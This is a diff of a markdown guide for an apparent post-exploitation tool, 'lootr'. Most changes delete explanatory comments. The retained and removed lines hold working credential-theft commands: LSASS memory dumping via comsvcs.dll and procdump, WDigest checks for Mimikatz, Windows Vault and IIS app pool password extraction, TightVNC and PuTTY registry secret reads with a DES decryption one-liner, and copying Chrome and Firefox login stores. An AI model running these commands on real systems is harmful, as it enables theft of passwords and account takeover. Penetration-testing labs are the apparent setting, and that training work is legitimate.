@@ -35,7 +35,6 @@ tags:
 ./lootr.sh --phase files
 ./lootr.sh --phase procs
 
-# Kali IP for reverse shell snippets in attack_commands.txt
 # Auto-detected from $SSH_CLIENT (set by sshd) — only needed if delivered via reverse shell
 ./lootr.sh --kali-ip 10.10.14.5
 
@@ -62,7 +61,6 @@ tags:
 .\lootr.ps1 -Phase network
 .\lootr.ps1 -Phase files
 
-# Kali IP for LHOST in msfvenom commands in attack_commands.txt
 # Auto-detected from active RDP/WinRM/SSH session — only needed if delivered via bind shell
 .\lootr.ps1 -KaliIp 10.10.14.5
 
@@ -356,8 +354,6 @@ find /opt /srv /data /backup /home /var/backups -type f 2>/dev/null | \
 
 # Database config files
 find / -name "*.db" -o -name "*.sqlite" -o -name "*.sqlite3" 2>/dev/null | grep -v proc
-# If you find a .db file: sqlite3 database.db .tables && sqlite3 database.db "SELECT * FROM users;"
-
 # SSH config with key path hints
 cat ~/.ssh/config 2>/dev/null
 cat /etc/ssh/ssh_config | grep IdentityFile
@@ -415,8 +411,6 @@ rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsassPid C:\Windows\Temp
 tasklist | findstr lsass
 procdump.exe -accepteula -ma <lsass_pid> C:\Temp\lsass.dmp
 
-# Parse dump on Kali → pypykatz lsa minidump lsass.dmp
-
 # WDigest — if enabled, plaintext passwords cached in memory
 reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential
 # If value = 1 or key missing → WDigest is enabled → Mimikatz sekurlsa::wdigest
@@ -427,8 +421,6 @@ reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v Use
 # Windows Vault / Credential Manager (full list)
 vaultcmd /list
 vaultcmd /listcreds:"Windows Credentials" /all
-# Includes: saved RDP passwords, network share credentials, web credentials
-
 # IIS application pool passwords
 Get-WebConfiguration system.applicationHost/applicationPools/add -recurse | \
   Select-Object name,userName,password | Format-List
@@ -441,9 +433,6 @@ Get-WmiObject Win32_Service | Select-Object Name, StartName, PathName | Format-L
 Get-ChildItem -Path C:\inetpub -Recurse -Filter "web.config" 2>$null | \
   Select-String -Pattern "password|connectionString" 2>$null
 
-# PowerShell SecureString that might be crackable
-# If you find: ConvertFrom-SecureString ... in a script
-# The encrypted value uses DPAPI — decrypt with the user's context
 # [System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($securestring))
 ```
 
@@ -460,9 +449,6 @@ type C:\Windows\System32\sysprep\sysprep.inf 2>$null
 # TightVNC / RealVNC password (stored in registry, DES-encrypted)
 reg query HKCU\Software\TightVNC\Server /v Password 2>$null
 reg query HKLM\Software\TightVNC\Server /v Password 2>$null
-# Decrypt with: echo -n 'HEX' | xxd -r -p | openssl enc -des-cbc -nopad -nosalt \
-#   -K e84ad660c4721ae0 -iv 0000000000000000 -d | cat
-
 # PuTTY saved sessions (may have proxy passwords)
 reg query HKCU\Software\SimonTatham\PuTTY\Sessions /s 2>$null | findstr /i "hostname\|password"
 ```
@@ -471,8 +457,6 @@ reg query HKCU\Software\SimonTatham\PuTTY\Sessions /s 2>$null | findstr /i "host
 ```powershell
 # Chrome: copy the Login Data file and decrypt on Kali
 copy "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data" C:\Temp\chrome_logins
-# Transfer to Kali: python3 chrome_decrypt.py or use pypykatz
-
 # Firefox: copy profile directory
 $profile = Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles" -Directory | Select-Object -First 1
 copy "$($profile.FullName)\logins.json" C:\Temp\ff_logins.json
